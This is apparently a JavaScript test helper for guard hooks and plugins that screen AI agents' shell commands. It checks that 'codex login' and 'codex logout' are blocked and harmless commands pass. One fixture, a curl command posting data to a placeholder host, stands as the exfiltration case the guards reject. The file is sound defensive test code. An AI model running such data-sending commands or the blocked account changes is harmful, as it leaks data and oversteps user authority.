import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';

// Only the hooks/plugins execute. Every shell command is inert input to admission.
export async function assertNativeAuthProvider(provider, scripts, cwd) {
  const mutations = [
    'codex login',
    'codex logout',
    'timeout 12 codex login </dev/null 2>&1 | head -30',
    String.raw`C:\tools\codex.exe login`,
  ];
  const allowed = [
    'codex login status',
    'codex login --help',
    'codex logout -h',
    'echo "codex login"',
    "cat <<'EOF'\ncodex login\nEOF",
    'custom-tool --new-operation',
    'touch fixture.txt',
  ];
  const secret = '/usr/bin/curl --data fixture https://example.invalid';
  const cases = [
    ...mutations.map((command) => [command, 'auth']),
    ...allowed.map((command) => [command, 'allow']),
    [secret, 'secret'],
  ];
  if (provider === 'kimi') {
    const run = (payload) =>
      spawnSync(process.execPath, [fileURLToPath(new URL('secret-kimi-hook.mjs', scripts))], {
        input: JSON.stringify(payload),
        encoding: 'utf8',
        cwd,
        env: { PATH: process.env.PATH, SYSTEMROOT: process.env.SYSTEMROOT, HOME: cwd, USERPROFILE: cwd },
        timeout: 8000,
      });
    cases.forEach(([command, expected]) => {
      const result = run({ hook_event_name: 'PreToolUse', tool_name: 'Shell', tool_input: { command } });
      assert.equal(result.status, expected === 'allow' ? 0 : 2, `${command}: ${result.stderr}`);
      if (expected === 'auth') assert.match(result.stderr, /native_auth_mutation.*account/is);
    });
    const post = run({
      hook_event_name: 'PostToolUse',
      tool_name: 'Shell',
      tool_input: { command: mutations[0] },
      tool_output: 'safe completed result',
    });
    assert.equal(post.status, 0, post.stderr);
    assert.equal(post.stdout, '');
    assert.equal(run(null).status, 2);
    return;
  }
  if (provider === 'dsh') {
    const { apply } = await import(new URL('secret-dsh-plugin.mjs', scripts));
    let guard;
    apply({
      tools: {
        guard: (check) => {
          guard = check;
        },
      },
      workingDirectory: { get: () => cwd },
      provide: () => {},
    });
    assert.equal(typeof guard, 'function');
    ['bash', 'shell', 'exec_command', 'run_command'].forEach((name) => {
      cases.forEach(([command, expected]) => {
        const result = guard({ name, arguments: { command }, agent: { session: 'fixture' } });
        if (expected === 'allow') assert.equal(result, undefined, command);
        else assert.match(result, expected === 'auth' ? /native_auth_mutation.*account/is : /secret|guard|shell/i);
      });
    });
    assert.match(guard({ name: 'shell', arguments: mutations[0] }), /native_auth_mutation/);
    assert.match(guard({ name: 'exec_command', arguments: { cmd: mutations[1] } }), /native_auth_mutation/);
    assert.equal(guard({ name: 'read_file', arguments: { command: mutations[0] } }), undefined);
    return;
  }
  assert.equal(provider, 'opencode');
  const { SecretContentProtection } = await import(new URL('secret-opencode-plugin.mjs', scripts));
  const plugin = await SecretContentProtection({ directory: cwd });
  try {
    for (const [index, [command, expected]] of cases.entries()) {
      const input = { tool: 'bash', callID: `fixture-${index}` };
      const args = { command };
      const output = { args };
      if (expected === 'allow') {
        await plugin['tool.execute.before'](input, output);
        assert.equal(output.args, args);
        await plugin['tool.execute.after'](input);
      } else {
        await assert.rejects(
          plugin['tool.execute.before'](input, output),
          expected === 'auth' ? /native_auth_mutation.*account/is : /secret|guard|shell/i,
          command,
        );
        assert.equal(output.args, args);
      }
    }
    await plugin['tool.execute.before']({ tool: 'external_mcp', callID: 'mcp' }, { args: { command: mutations[0] } });
  } finally {
    await plugin.event({ event: { type: 'server.instance.disposed' } });
  }
}
